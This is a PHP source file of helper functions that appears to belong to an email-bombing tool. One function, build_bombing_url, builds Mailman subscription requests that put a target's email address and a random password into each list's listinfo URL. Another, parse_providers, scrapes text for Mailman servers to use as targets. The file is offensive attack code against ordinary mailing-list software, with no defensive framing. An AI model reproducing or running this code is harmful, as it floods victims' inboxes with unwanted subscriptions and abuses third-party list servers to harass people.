<?php
function startsWith($haystack, $needle) {
    $length = strlen($needle);
    return substr($haystack, 0, $length) === $needle;
}

function endsWith($haystack, $needle) {
    $length = strlen($needle);
    if (!$length) {
        return true;
    }
    return substr($haystack, -$length) === $needle;
}

function pretty_json_encode($raw) {
    return json_encode($raw, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
}

function println($msg) {
    echo $msg . PHP_EOL;
}

function build_bombing_url($node,$email) {
    $pw=generate_password(10);
    return $node.'?email='.$email.'&fullname=&pw='.$pw.'&pw-conf='.$pw.'&digest=0&language=en&email-button=Subscribe';
}

function generate_password($length = 8) {

    $chars = 'abcdefghijklmnoABCDEFGHIJKZ0123456789';

    $password = '';

    for ($i = 0; $i < $length; $i++) {
        $password .= $chars[mt_rand(0, strlen($chars) - 1)];

    }

    return $password;

}
function parse_providers($haystack){
    preg_match_all('/http[s]{0,1}:\/\/([A-Za-z0-9\-_\/:\.]*?)\/mailman/',$haystack,$m);
    $providers=[];
    foreach ($m[0] as $item){
        $url=$item.'/listinfo';
        if(startsWith($url,'https://')){
            $url='http://'.substr($url,8,strlen($url));
        }
        $providers[]=$url;
    }
    $providers=array_unique($providers);
    return $providers;
}
